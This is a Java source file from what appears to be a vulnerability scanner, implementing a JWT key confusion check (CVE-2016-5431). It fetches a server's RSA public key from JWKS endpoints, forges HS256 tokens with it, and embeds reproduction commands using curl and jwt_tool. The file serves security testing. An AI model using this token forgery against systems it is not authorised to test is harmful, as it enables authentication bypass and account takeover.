package gg.effront.anarcry.scanner.crypto.jwt;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.util.Http;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.math.BigInteger;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.RSAPublicKeySpec;
import java.time.Duration;
import java.util.Base64;
import java.util.List;
import java.util.Optional;
import java.util.function.Consumer;

/**
 * Key confusion attack via JWKS endpoint: fetches the server's RSA public key
 * from a well-known JWKS URL, then uses it as the HMAC-SHA256 secret to forge
 * an HS256 token. If the server does not pin the expected algorithm, it will
 * verify HS256 using the RSA public key bytes -- accepting the forged token.
 *
 * <p>
 * This complements {@link Rs256Hs256Probe} which extracts the public key from
 * the TLS certificate. This probe uses the JWKS endpoint, which is the standard
 * key distribution mechanism for OAuth2/OIDC servers and often exposes the
 * exact key used for JWT verification.
 */
public class KeyConfusionProbe {

    private static final List<String> AUTH_PATHS = List.of("/api/me", "/api/user", "/api/profile");

    private static final List<String> JWKS_PATHS = List.of("/.well-known/jwks.json", "/oauth/jwks",
            "/.well-known/openid-configuration", "/api/jwks", "/.well-known/keys", "/jwks.json", "/certs",
            "/oauth2/v1/certs");

    public Optional<Finding> probe(String[] parts, ScanContext ctx, String base, HttpClient hc, Consumer<String> log) {
        log.accept("[~] JWT: probe key confusion via JWKS public key (CVE-2016-5431)");
        try {
            // Discover JWKS endpoint and extract RSA public key
            RSAPublicKey pubKey = discoverPublicKey(ctx, base, hc, log);
            if (pubKey == null) {
                log.accept("[~] JWT: key confusion -- nenhuma chave publica RSA" + " encontrada via JWKS");
                return Optional.empty();
            }

            // Convert to PEM and DER formats -- different libraries use different
            // representations as the HMAC secret
            byte[] derKey = pubKey.getEncoded();
            String b64Key = Base64.getMimeEncoder(64, new byte[]{'\n'}).encodeToString(derKey);
            String pemKey = "-----BEGIN PUBLIC KEY-----\n" + b64Key + "\n-----END PUBLIC KEY-----\n";

            byte[][] keyFormats = new byte[][]{pemKey.getBytes(StandardCharsets.UTF_8), // PEM with headers
                    derKey, // Raw DER (SubjectPublicKeyInfo)
            };
            String[] formatNames = new String[]{"PEM", "DER"};

            String forgedHeader = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString("{\"alg\":\"HS256\",\"typ\":\"JWT\"}".getBytes(StandardCharsets.UTF_8));

            for (int i = 0; i < keyFormats.length; i++) {
                byte[] keyBytes = keyFormats[i];
                String formatName = formatNames[i];
                String sigInput = forgedHeader + "." + parts[1];

                Mac mac = Mac.getInstance("HmacSHA256");
                mac.init(new SecretKeySpec(keyBytes, "HmacSHA256"));
                String forgedToken = sigInput + "." + Base64.getUrlEncoder().withoutPadding()
                        .encodeToString(mac.doFinal(sigInput.getBytes(StandardCharsets.UTF_8)));

                log.accept("[~] JWT: key confusion (" + formatName + ") token forjado," + " enviando probes");
                for (String path : AUTH_PATHS) {
                    try {
                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
                                .header("Authorization", "Bearer " + forgedToken).timeout(Duration.ofSeconds(5)).GET()
                                .build();
                        HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(),
                                "JWT");
                        log.accept("[~] JWT: key confusion (" + formatName + ") " + path + " -> HTTP "
                                + resp.statusCode());
                        if (resp.statusCode() == 200) {
                            String cweId = CweRegistry.cweId("JWT");
                            String cweTitle = CweRegistry.cweTitle("JWT");
                            String cvssVector = CweRegistry.cvssVector("JWT");
                            double score = CvssCalculator.calculate(cvssVector);
                            return Optional.of(Finding.of("JWT", base + path,
                                    "Key confusion via JWKS public key (CVE-2016-5431)", Severity.CRITICAL,
                                    "Probe em " + base + path + " -> HTTP 200 com HS256 assinado usando chave"
                                            + " publica " + formatName + " do JWKS",
                                    "Servidor aceita HS256 com a chave publica RSA do JWKS"
                                            + " como segredo HMAC -- qualquer um com acesso"
                                            + " ao JWKS pode forjar tokens",
                                    "# 1. Obter chave publica do JWKS:\n" + "curl -s " + base
                                            + "/.well-known/jwks.json | jq '.keys[0]'\n"
                                            + "# 2. Converter JWK para PEM:\n"
                                            + "python3 -c \"from jwcrypto import jwk;"
                                            + " import json; k=jwk.JWK(**json.load(open"
                                            + "('jwk.json'))); print(k.export_to_pem())\"\n"
                                            + "# 3. Assinar HS256 com a chave publica:\n"
                                            + "python3 jwt_tool.py <token> -X k" + " -pk jwks_pub.pem",
                                    "Validar explicitamente o algoritmo esperado no servidor;"
                                            + " rejeitar tokens com alg diferente do"
                                            + " configurado; nunca usar a mesma chave para" + " RSA e HMAC",
                                    cweId, cweTitle, cvssVector, score));
                        }
                    } catch (Exception ex) {
                        log.accept("[~] JWT: key confusion (" + formatName + ") " + path + " -- " + ex.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            log.accept("[~] JWT: key confusion -- " + e.getMessage());
        }
        return Optional.empty();
    }

    /**
     * Tries well-known JWKS endpoints to discover an RSA public key. Also follows
     * the {@code jwks_uri} from OpenID Connect discovery if present.
     */
    private RSAPublicKey discoverPublicKey(ScanContext ctx, String base, HttpClient hc, Consumer<String> log) {
        for (String jwksPath : JWKS_PATHS) {
            try {
                String url = base + jwksPath;
                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(5)).GET()
                        .build();
                HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), "JWT");

                if (resp.statusCode() != 200 || resp.body() == null) {
                    continue;
                }

                String body = resp.body().trim();

                // Handle OpenID Connect discovery -- follow jwks_uri
                if (jwksPath.contains("openid-configuration")) {
                    body = followJwksUri(body, ctx, hc, log);
                    if (body == null) {
                        continue;
                    }
                }

                // Parse JWKS and extract first RSA key
                RSAPublicKey key = extractRsaKeyFromJwks(body, log);
                if (key != null) {
                    log.accept("[~] JWT: key confusion -- chave publica RSA extraida de " + url);
                    return key;
                }
            } catch (Exception e) {
                // Endpoint not available -- try next
            }
        }
        return null;
    }

    /**
     * Parses an OpenID Connect discovery document and fetches the JWKS from the
     * {@code jwks_uri} field.
     */
    private String followJwksUri(String discoveryBody, ScanContext ctx, HttpClient hc, Consumer<String> log) {
        try {
            JsonObject config = JsonParser.parseString(discoveryBody).getAsJsonObject();
            if (!config.has("jwks_uri")) {
                return null;
            }
            String jwksUri = config.get("jwks_uri").getAsString();
            log.accept("[~] JWT: key confusion -- seguindo jwks_uri: " + jwksUri);
            HttpRequest jwksReq = HttpRequest.newBuilder().uri(URI.create(jwksUri)).timeout(Duration.ofSeconds(5)).GET()
                    .build();
            HttpResponse<String> jwksResp = Http.send(ctx, hc, jwksReq, HttpResponse.BodyHandlers.ofString(), "JWT");
            if (jwksResp.statusCode() == 200 && jwksResp.body() != null) {
                return jwksResp.body().trim();
            }
        } catch (Exception e) {
            log.accept("[~] JWT: key confusion -- erro ao seguir jwks_uri: " + e.getMessage());
        }
        return null;
    }

    /**
     * Extracts the first RSA public key from a JWKS JSON document. Returns null if
     * no RSA key is found or the JSON is malformed.
     */
    private RSAPublicKey extractRsaKeyFromJwks(String json, Consumer<String> log) {
        try {
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            if (!root.has("keys")) {
                return null;
            }
            JsonArray keys = root.getAsJsonArray("keys");
            for (JsonElement elem : keys) {
                JsonObject jwk = elem.getAsJsonObject();
                String kty = jwk.has("kty") ? jwk.get("kty").getAsString() : "";
                if (!"RSA".equals(kty)) {
                    continue;
                }
                if (!jwk.has("n") || !jwk.has("e")) {
                    continue;
                }
                String n = jwk.get("n").getAsString();
                String e = jwk.get("e").getAsString();
                byte[] nBytes = Base64.getUrlDecoder().decode(padB64(n));
                byte[] eBytes = Base64.getUrlDecoder().decode(padB64(e));

                BigInteger modulus = new BigInteger(1, nBytes);
                BigInteger exponent = new BigInteger(1, eBytes);

                KeyFactory kf = KeyFactory.getInstance("RSA");
                return (RSAPublicKey) kf.generatePublic(new RSAPublicKeySpec(modulus, exponent));
            }
        } catch (Exception e) {
            log.accept("[~] JWT: key confusion -- erro ao parsear JWKS: " + e.getMessage());
        }
        return null;
    }

    private static String padB64(String s) {
        int mod = s.length() % 4;
        return mod == 0 ? s : s + "=".repeat(4 - mod);
    }
}
